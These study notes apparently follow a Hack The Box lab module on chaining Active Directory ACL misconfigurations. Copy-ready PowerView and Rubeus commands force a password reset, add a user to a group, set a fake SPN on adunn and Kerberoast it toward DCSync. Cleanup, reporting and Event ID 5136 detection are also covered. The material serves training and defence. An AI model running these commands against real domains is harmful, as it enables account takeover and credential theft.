## 1. Module Overview

This module demonstrates how **misconfigured Active Directory ACLs** can be chained together to move from a low-privileged user toward highly privileged access.

The lab attack chain starts with control of:

```text
wley
```

and ultimately targets:

```text
adunn
```

The `adunn` account has rights that can be leveraged for:

```text
DCSync
```

The complete chain demonstrated in the module is:

```text
wley
 │
 │ User-Force-Change-Password
 ▼
damundsen
 │
 │ GenericWrite
 ▼
Help Desk Level 1
 │
 │ Nested Group Membership
 ▼
Information Technology
 │
 │ GenericAll
 ▼
adunn
 │
 │ Replication Rights
 ▼
DCSync
```

The module describes three major stages:

1. Use `wley` to change `damundsen`'s password.
    
2. Authenticate as `damundsen` and use `GenericWrite` to add a controlled account to `Help Desk Level 1`.
    
3. Use nested group membership and `GenericAll` over `adunn` to gain further control.
    

---

# 2. Starting Point

We are already in control of:

```text
wley
```

The previous stage of the assessment obtained the user's NTLMv2 hash through Responder, and the weak password was cracked offline.

The important point for this module is simply:

```text
We control wley
```

From there, ACL enumeration revealed that `wley` has the:

```text
User-Force-Change-Password
```

right over:

```text
damundsen
```

This gives us the first step of the attack chain.

---

# 3. Attack Chain at a Glance

```text
                 ACL ABUSE ATTACK CHAIN

                    ┌─────────┐
                    │  wley   │
                    └────┬────┘
                         │
              ForceChangePassword
                         │
                         ▼
                  ┌────────────┐
                  │ damundsen  │
                  └─────┬──────┘
                        │
                    GenericWrite
                        │
                        ▼
              ┌───────────────────┐
              │ Help Desk Level 1 │
              └─────────┬─────────┘
                        │
                  Nested Membership
                        │
                        ▼
              ┌─────────────────────┐
              │ Information         │
              │ Technology          │
              └─────────┬───────────┘
                        │
                     GenericAll
                        │
                        ▼
                   ┌─────────┐
                   │  adunn  │
                   └────┬────┘
                        │
                 Replication Rights
                        │
                        ▼
                    DCSync
```

---

# 4. Step 1 — Create a PSCredential Object

We first authenticate as `wley`.

Create a `SecureString`:

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
```

Then create the credential object:

```powershell
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

### What is happening?

```text
Plaintext password
       ↓
ConvertTo-SecureString
       ↓
SecureString
       ↓
PSCredential
       ↓
INLANEFREIGHT\wley
```

The resulting `$Cred` object can be supplied to PowerView functions that support alternate credentials.

---

# 5. Creating the Target Password

We need a password that will be assigned to `damundsen`.

The module uses:

```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

This creates a `SecureString` representation of the password.

---

# 6. Force Changing damundsen's Password

Import PowerView:

```powershell
cd C:\Tools\
Import-Module .\PowerView.ps1
```

Then:

```powershell
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

Expected output:

```text
VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```

This confirms that the password for `damundsen` was successfully reset using the credentials of `wley`.

### Important command

```powershell
Set-DomainUserPassword
```

### Important flag

```text
-Credential
```

This allows the command to perform the operation using the supplied `PSCredential`.

---

# 7. Why This Works

The ACL relationship discovered earlier was:

```text
wley
  │
  │ User-Force-Change-Password
  ▼
damundsen
```

Therefore, `wley` does not need to know the existing password of `damundsen` to perform the password-reset operation.

Conceptually:

```text
Current damundsen password
          │
          │ NOT required
          ▼
   Force password change
          │
          ▼
 New password controlled by us
```

---

# 8. Authenticate as damundsen

Now create credentials for `damundsen`.

```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

Then:

```powershell
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

We now have:

```text
$Cred2
   │
   └── INLANEFREIGHT\damundsen
```

---

# 9. Step 2 — GenericWrite over Help Desk Level 1

From the ACL enumeration module, we already discovered:

```text
damundsen
      │
      │ GenericWrite
      ▼
Help Desk Level 1
```

This is extremely important.

The objective is to add `damundsen` to:

```text
Help Desk Level 1
```

The module first checks the existing group membership.

```powershell
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

The output lists the existing members of the group.

---

# 10. Add damundsen to Help Desk Level 1

Use:

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

Expected output:

```text
VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```

This modifies the group membership using `damundsen`'s credentials.

---

# 11. Confirm Group Membership

Verify:

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

The output includes:

```text
damundsen
dpayne
```

among the group members.

### Important concept

The ACL did not directly give us control over `adunn`.

Instead:

```text
GenericWrite
     ↓
Modify group membership
     ↓
Nested group membership
     ↓
Inherited privileges
```

This is why **nested groups are so important during ACL abuse**.

---

# 12. Nested Group Membership

The relationship is:

```text
damundsen
     │
     ▼
Help Desk Level 1
     │
     │ nested membership
     ▼
Information Technology
```

Because `Help Desk Level 1` is nested in `Information Technology`, adding `damundsen` to the former provides membership-derived access associated with the latter.

The module explicitly states that this inherited membership allows us to leverage rights over `adunn`.

---

# 13. Step 3 — GenericAll over adunn

The next important relationship is:

```text
Information Technology
          │
          │ GenericAll
          ▼
        adunn
```

`GenericAll` gives broad control over the target object.

The module chooses a particularly useful technique:

```text
Targeted Kerberoasting
```

instead of simply changing `adunn`'s password.

Why?

Because `adunn` is described as an administrator account that should not be interrupted.

The module therefore demonstrates an approach that modifies the `servicePrincipalName` attribute to create a temporary/fake SPN.

---

# 14. What Is an SPN?

**SPN = Service Principal Name**

An SPN associates a service with an account in Active Directory.

Kerberos can use an SPN to request a service ticket.

Simplified:

```text
Account
   │
   └── servicePrincipalName
             │
             ▼
        Kerberos Service
             │
             ▼
          TGS Ticket
```

If an attacker can manipulate an account's SPN and request a service ticket for it, the resulting ticket can potentially be subjected to offline password cracking.

---

# 15. Creating a Fake SPN

The module uses:

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

Important pieces:

```text
-Credential $Cred2
```

Use the `damundsen` credentials.

```text
-Identity adunn
```

Target the `adunn` account.

```text
-SET @{serviceprincipalname='notahacker/LEGIT'}
```

Set the SPN value.

The module's verbose output confirms:

```text
[Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
```

---

# 16. Targeted Kerberoasting

The module mentions an alternative Linux tool:

```text
targetedKerberoast
```

It can create a temporary SPN, retrieve the ticket/hash, and remove the temporary SPN as part of the process.

The module itself demonstrates the process with:

```text
Rubeus
```

---

# 17. Kerberoasting with Rubeus

Command:

```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

The important output includes:

```text
[*] Action: Kerberoasting

[*] Target User            : adunn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Total kerberoastable users : 1

[*] SamAccountName         : adunn
[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : notahacker/LEGIT
[*] PwdLastSet             : 3/1/2022 11:29:08 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$ <SNIP>
```

---

# 18. What We Obtained

The important result is:

```text
$krb5tgs$23$...
```

This is a Kerberos TGS hash suitable for offline password-cracking attempts.

The module's next step would be using:

```text
Hashcat
```

to attempt offline cracking.

If the password is recovered, we can authenticate as:

```text
adunn
```

and proceed to the DCSync stage.

---

# 19. Complete Attack Chain

At this point, the entire path is:

```text
┌─────────────┐
│    WLEY     │
└──────┬──────┘
       │
       │ ForceChangePassword
       ▼
┌─────────────┐
│  DAMUNDSEN  │
└──────┬──────┘
       │
       │ GenericWrite
       ▼
┌───────────────────┐
│ Help Desk Level 1 │
└─────────┬─────────┘
          │
          │ Nested Group
          ▼
┌──────────────────────┐
│ Information Technology│
└──────────┬───────────┘
           │
           │ GenericAll
           ▼
      ┌─────────┐
      │  ADUNN  │
      └────┬────┘
           │
           │ Modify SPN
           ▼
     ┌──────────────┐
     │ Kerberoasting│
     └──────┬───────┘
            │
            ▼
        TGS Hash
            │
            ▼
      Offline Crack
            │
            ▼
         ADUNN
            │
            ▼
         DCSync
```

This is the **main diagram to memorize** for the module.

---

# 20. Cleanup

A professional assessment does not end after obtaining access.

The module specifically emphasizes cleanup.

There are **three important cleanup tasks**:

1. Remove the fake SPN from `adunn`.
    
2. Remove `damundsen` from `Help Desk Level 1`.
    
3. Restore the original password for `damundsen`, if known, or have the client reset it.
    

### Important

The order matters.

The module warns that if we remove the user from the group **first**, we may lose the permissions required to remove the fake SPN.

---

# 21. Remove the Fake SPN

Command:

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

Expected behavior:

```text
[Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'
```

This removes the temporary SPN.

---

# 22. Remove damundsen from the Group

Command:

```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

Expected output:

```text
VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'
True
```

---

# 23. Confirm Removal

Run:

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

The absence of the user confirms that `damundsen` was removed from the group.

---

# 24. Restore damundsen's Password

The module recommends:

```text
Set damundsen's password back to its original value
```

if it is known.

Otherwise:

```text
Have the client set the password
```

or alert the appropriate user/admin.

The important lesson is:

> **Every modification made during an assessment should be documented and, where appropriate, reverted.**

---

# 25. Assessment Documentation

Even after cleanup, the module emphasizes documenting every modification.

Why?

Because the client needs to know:

- What was changed
    
- Which account was modified
    
- Which groups were changed
    
- What temporary objects/attributes were created
    
- What was removed
    
- What could not be restored
    
- What security impact existed
    

The source explicitly recommends including modifications in the final assessment report.

---

# 26. ACL Abuse Is Not Always Worth Executing

This is an important professional pentesting lesson.

A discovered ACL attack path does **not automatically mean you should execute it**.

The module points out that some ACL chains may be:

- Time-consuming
    
- Potentially destructive
    
- Unnecessary to prove the finding
    

In those situations, enumeration and evidence may be sufficient for the client to understand and remediate the issue.

### Professional mindset

```text
Can I exploit it?
       ↓
Can I prove it safely?
       ↓
Will exploitation cause disruption?
       ↓
Do I have authorization?
       ↓
Is exploitation necessary?
```

---

# 27. Detection and Remediation

The module provides three major recommendations.

## 27.1 Audit and Remove Dangerous ACLs

Organizations should regularly audit Active Directory ACLs.

Tools such as:

```text
BloodHound
```

can help identify potentially dangerous ACL relationships.

The goal is:

```text
Find dangerous ACL
       ↓
Determine whether necessary
       ↓
Remove excessive permissions
```

---

# 28. Monitor Group Membership

Important groups should be monitored closely.

Especially:

```text
High-impact groups
```

Unexpected membership changes can indicate an ACL abuse chain.

Example:

```text
Unexpected user
      ↓
Added to privileged group
      ↓
Potential ACL abuse
```

The module specifically recommends monitoring important group memberships and alerting on suspicious changes.

---

# 29. Audit ACL Changes

The module recommends enabling:

```text
Advanced Security Audit Policy
```

One particularly relevant event is:

```text
Event ID 5136
```

which represents:

```text
A directory service object was modified
```

This can help identify modifications to AD objects that may be associated with ACL abuse.

---

# 30. Event ID 5136

The module demonstrates an Event ID `5136` generated after modifying the domain object's ACL.

The event contains information about the directory service modification.

However, some information is represented using:

```text
SDDL
```

---

# 31. SDDL

**SDDL = Security Descriptor Definition Language**

It represents Windows security descriptors in a compact string format.

Example from the module:

```text
O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-...)
```

This is difficult to understand directly.

The module therefore demonstrates converting it into a more readable form.

---

# 32. Convert SDDL to Readable Format

Use:

```powershell
ConvertFrom-SddlString "<SDDL STRING>"
```

Example:

```powershell
ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)..."
```

The module then expands the security descriptor into properties such as:

```text
Owner
Group
DiscretionaryAcl
SystemAcl
RawDescriptor
```

---

# 33. Investigating the DiscretionaryAcl

The module filters specifically on:

```text
DiscretionaryAcl
```

The output reveals a suspicious entry:

```text
INLANEFREIGHT\mrb3n:
AccessAllowed
(GenericWrite ...)
```

The module explains that this modification was likely giving:

```text
mrb3n
```

`GenericWrite` privileges over the domain object itself, which could indicate an attack attempt.

---

# 34. Important Detection Chain

A defender can think about the attack like this:

```text
ACL Modification
      ↓
Directory Service Change
      ↓
Event ID 5136
      ↓
Inspect SDDL
      ↓
Convert SDDL
      ↓
Inspect DiscretionaryAcl
      ↓
Identify unexpected principal
      ↓
Investigate potential ACL abuse
```

---

# 35. Important Commands — Cheat Sheet

## Create SecureString

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
```

## Create PSCredential

```powershell
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

## Create damundsen password

```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

## Import PowerView

```powershell
Import-Module .\PowerView.ps1
```

## Reset target password

```powershell
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

## Create damundsen credentials

```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

## Check group members

```powershell
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

## Add user to group

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

## Verify membership

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

## Modify SPN

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

## Kerberoast

```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

## Remove SPN

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

## Remove group membership

```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

## Verify removal

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

## Convert SDDL

```powershell
ConvertFrom-SddlString "<SDDL STRING>"
```

---

# 36. Tools Used

|Tool|Purpose|
|---|---|
|PowerView|AD enumeration and ACL abuse|
|PowerShell|Native AD interaction|
|Rubeus|Kerberos operations / Kerberoasting|
|Hashcat|Offline password cracking|
|BloodHound|ACL/path visualization|
|SharpHound|BloodHound data collection|
|Responder|Previous-stage credential capture|
|targetedKerberoast|Alternative targeted Kerberoasting tool|
|pth-toolkit|Alternative Linux-side authentication approach|

---

# 37. Important Permissions to Remember

## User-Force-Change-Password

```text
wley
 ↓
damundsen
```

Allows the controlling user to force a password reset for the target.

---

## GenericWrite

```text
damundsen
 ↓
Help Desk Level 1
```

Allows modification of appropriate properties of the target object and, in this scenario, enables modification of group membership.

---

## GenericAll

```text
Information Technology
 ↓
adunn
```

Represents broad control over the target object.

In this module, it enables manipulation of `adunn`'s properties, including the `servicePrincipalName` attribute.

---

## DCSync-Related Rights

The eventual target has:

```text
DS-Replication-Get-Changes
```

and:

```text
DS-Replication-Get-Changes-In-Filtered-Set
```

These replication permissions are associated with the ability to perform DCSync, which is covered in the next module.

---

# 38. BloodHound Perspective

Although this module performs the attack chain manually, BloodHound can visualize the relationships.

The important BloodHound concepts are:

```text
First Degree Object Control
```

and:

```text
Transitive Object Control
```

For the starting user:

```text
wley
```

BloodHound can show:

```text
wley
 ↓ ForceChangePassword
damundsen
```

and then the larger transitive attack path.

The module also demonstrates the **Help** option on an edge, which provides information about the permission, tools, commands, OPSEC considerations, and references.

---

# 39. Most Important Concept — Follow the Chain

Don't stop when you discover:

```text
wley → damundsen
```

Ask:

```text
What can damundsen control?
```

Then:

```text
What group can damundsen join?
```

Then:

```text
What is that group nested inside?
```

Then:

```text
What can that group control?
```

Then:

```text
What can we do with that control?
```

The complete methodology is:

```text
ACL
 ↓
Permission
 ↓
Target
 ↓
Group Membership
 ↓
Nested Group
 ↓
New Permission
 ↓
New Target
 ↓
Privilege Escalation
```

---

# 40. Exam / HTB Quick Revision

### Starting controlled account

```text
wley
```

### First target

```text
damundsen
```

### First permission

```text
User-Force-Change-Password
```

### Second permission

```text
GenericWrite
```

### Group

```text
Help Desk Level 1
```

### Nested group

```text
Information Technology
```

### High-impact permission

```text
GenericAll
```

### Target account

```text
adunn
```

### Attribute abused

```text
servicePrincipalName
```

### Technique demonstrated

```text
Targeted Kerberoasting
```

### Tool

```text
Rubeus
```

### Result

```text
TGS hash
```

### Next step

```text
Offline password cracking
```

### Final capability

```text
DCSync
```

### Detection event

```text
Event ID 5136
```

### Descriptor format

```text
SDDL
```

### Conversion command

```powershell
ConvertFrom-SddlString
```

---

# 41. Final Attack Path to Memorize

```text
                 WLEY
                   │
                   │
       User-Force-Change-Password
                   │
                   ▼
              DAMUNDSEN
                   │
                   │
              GenericWrite
                   │
                   ▼
          HELP DESK LEVEL 1
                   │
                   │
            Nested Membership
                   │
                   ▼
        INFORMATION TECHNOLOGY
                   │
                   │
               GenericAll
                   │
                   ▼
                 ADUNN
                   │
                   │
          Modify servicePrincipalName
                   │
                   ▼
          Targeted Kerberoasting
                   │
                   ▼
               TGS HASH
                   │
                   ▼
            Offline Cracking
                   │
                   ▼
                 ADUNN
                   │
                   ▼
                DCSYNC
```

---

# 42. Key Lessons

### 1. ACLs can create attack paths

A seemingly minor permission can become dangerous when combined with other permissions.

### 2. Always follow nested groups

A user's direct permissions may not reveal the complete attack path.

### 3. GenericWrite can be powerful

The impact depends on the target object and which properties can be modified.

### 4. GenericAll is extremely significant

It represents broad control over the target object.

### 5. SPNs can be abused for Kerberos attacks

If an attacker can manipulate an account's SPN, targeted Kerberoasting may become possible.

### 6. Cleanup matters

Remove temporary changes in the correct order.

### 7. Document everything

Every modification made during a penetration test should be recorded.

### 8. Exploitation isn't always necessary

If an attack path is potentially destructive, proving the path through enumeration may be preferable.

### 9. Defenders should monitor ACL and group changes

Particularly:

```text
Event ID 5136
```

and unexpected changes to high-impact groups.

---

# 43. One-Minute Revision

```text
CONTROL WLEY
     ↓
ForceChangePassword
     ↓
RESET DAMUNDSEN PASSWORD
     ↓
AUTHENTICATE AS DAMUNDSEN
     ↓
GenericWrite
     ↓
ADD DAMUNDSEN TO HELP DESK LEVEL 1
     ↓
NESTED GROUP
     ↓
INFORMATION TECHNOLOGY
     ↓
GenericAll
     ↓
CONTROL ADUNN
     ↓
MODIFY SPN
     ↓
KERBEROAST
     ↓
TGS HASH
     ↓
CRACK OFFLINE
     ↓
ADUNN
     ↓
DCSYNC
```

**This is the core of the ACL Abuse Tactics module.**